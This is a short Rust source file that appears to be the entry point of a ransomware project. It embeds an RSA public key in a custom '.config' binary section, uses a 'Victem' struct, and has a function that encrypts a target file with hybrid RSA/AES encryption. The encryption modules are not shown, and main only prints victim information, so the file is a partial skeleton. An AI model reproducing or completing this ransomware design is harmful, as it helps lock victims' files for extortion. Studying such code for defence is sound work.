#![allow(dead_code)]
#![allow(unused_imports)]
mod sys;
mod crypt;
mod config;
mod utils;
use sys::file_sys::FILESYS;
use std::io::Error;
use config::Config;
use crypt::symmetric::aes_func::sym_encrypt_file;
use rsa::pkcs1::DecodeRsaPublicKey;
use sys::victem::Victem;

#[link_section = ".config"]
static CONFIG_DATA : [u8; 270] = [0; 270];

fn foo() -> Result<() , Error> {
    let der_encoded_key = CONFIG_DATA;
    
    let key = rsa::RsaPublicKey::from_pkcs1_der(&der_encoded_key)
        .expect("Invalid RSA public key bytes");

    sym_encrypt_file( "/home/locker/Desktop/target.txt" , &key , 1024, "Encryptkey")?;

    Ok(())
}


fn main() -> Result<() , Error> {
    let vim = Victem::new();
    println!("{:?}", vim);

    Ok(())
}